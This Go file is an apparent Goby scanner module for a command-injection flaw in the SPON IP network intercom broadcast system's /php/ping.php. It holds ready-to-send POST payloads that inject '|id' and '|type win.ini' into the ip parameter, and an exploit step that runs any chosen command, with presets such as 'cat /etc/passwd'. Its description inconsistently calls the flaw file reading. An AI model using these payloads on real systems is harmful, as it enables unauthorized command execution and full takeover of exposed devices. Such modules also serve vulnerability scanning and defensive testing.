package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "SPON IP network intercom broadcast system ping.php RCE",
  "Description": "World Bond Communication Co., Ltd. is an audio as the core of the Internet of things solution provider. An arbitrary file reading vulnerability exists in the IP network intercom broadcast system of WorldBond Communication Co., LTD., which can be used by attackers to obtain sensitive information",
  "Product": "SPON IP network intercom broadcast system",
  "Homepage": "https://www.spon.com.cn/",
  "DisclosureDate": "2021-08-24",
  "Author": "luckying1314@139.com",
  "GobyQuery": "body=\"lan/manifest.json\"",
  "Level": "3",
  "Impact": "<p>Command execution injection is mainly caused by the fact that the developer references the client parameters when the application system initiates the operating system command, and does not verify the validity of the parameters.&amp;amp;nbsp; Therefore, the attacker can inject malicious command parameters into the parameters, resulting in the execution of the malicious command specified by the attacker.&amp;amp;nbsp; &amp;amp;nbsp;Through this vulnerability, the attacker can execute any operating system commands and directly gain full control of the operating system in the case of improper permission configuration.<br></p>",
  "Recommandation": "<p>1. Verify the validity of the value passed by the parameter</p><p>2. Restrict the execution permission of the application<br></p>",
  "References": [],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Command",
      "type": "createSelect",
      "value": "type C:\\Windows\\win.ini,dir,whoami,id,cat /etc/passwd",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "POST",
        "uri": "/php/ping.php",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data_type": "text",
        "data": "jsondata[ip]=%7Ctype C:\\Windows\\win.ini&jsondata[type]=0"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "[fonts]",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "POST",
        "uri": "/php/ping.php",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data_type": "text",
        "data": "jsondata[ip]=%7Cid&jsondata[type]=0"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "uid=",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/php/ping.php",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data_type": "text",
        "data": "jsondata[ip]=%7C{{{Command}}}&jsondata[type]=0"
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "RCE"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "SPON IP network intercom broadcast system"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}